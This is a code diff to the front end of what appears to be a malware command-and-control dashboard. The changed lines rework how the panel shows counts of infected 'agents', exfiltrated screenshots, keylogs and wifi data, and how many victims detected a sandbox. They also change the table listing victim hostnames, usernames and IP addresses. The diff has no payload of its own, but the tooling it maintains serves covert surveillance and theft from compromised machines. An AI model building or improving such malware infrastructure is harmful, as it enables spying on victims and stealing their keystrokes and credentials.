@@ -1981,22 +1981,22 @@
             const res = await apiCall('dashboard_data');
             if (!res) return;
 
-            $('stat-total').textContent = res.total_agents || 0;
-            $('stat-online').textContent = res.online_agents || 0;
-            $('stat-exfil').textContent = res.total_exfil || 0;
-            $('stat-sandbox').textContent = res.sandbox_detected || 0;
+            $('stat-total').textContent = res.stats?.total_sessions || 0;
+            $('stat-online').textContent = res.stats?.active_sessions || 0;
+            $('stat-exfil').textContent = (res.stats?.total_screenshots + res.stats?.total_keylogs + res.stats?.total_wifi) || 0;
+            $('stat-sandbox').textContent = res.sessions?.filter(s => s.sandbox_detected).length || 0;
 
-            $('agent-count-badge').textContent = res.online_agents || 0;
-            $('exfil-count-badge').textContent = res.total_exfil || 0;
+            $('agent-count-badge').textContent = res.stats?.active_sessions || 0;
+            $('exfil-count-badge').textContent = $('stat-exfil').textContent;
 
             // Recent agents
             const tbody = $('dashboard-agent-list');
-            if (res.recent_agents && res.recent_agents.length > 0) {
-                tbody.innerHTML = res.recent_agents.slice(0, 10).map(a => `
-            <tr class="agent-row" onclick="selectAgentFromRow('${a.session_id}')">
+            if (res.sessions && res.sessions.length > 0) {
+                tbody.innerHTML = res.sessions.slice(0, 10).map(a => `
+            <tr class="agent-row" onclick="selectAgentFromRow('${a.sessionId || a.session_id}')">
                 <td><strong>${a.hostname || 'Unknown'}</strong></td>
                 <td>${a.username || '—'}</td>
-                <td class="mono">${a.internal_ip || '—'}</td>
+                <td class="mono">${a.ip || a.internal_ip || '—'}</td>
                 <td>${a.os ? a.os.substring(0, 30) : '—'}</td>
                 <td>${getStatusBadge(a)}</td>
                 <td>${formatDate(a.last_seen || a.timestamp)}</td>
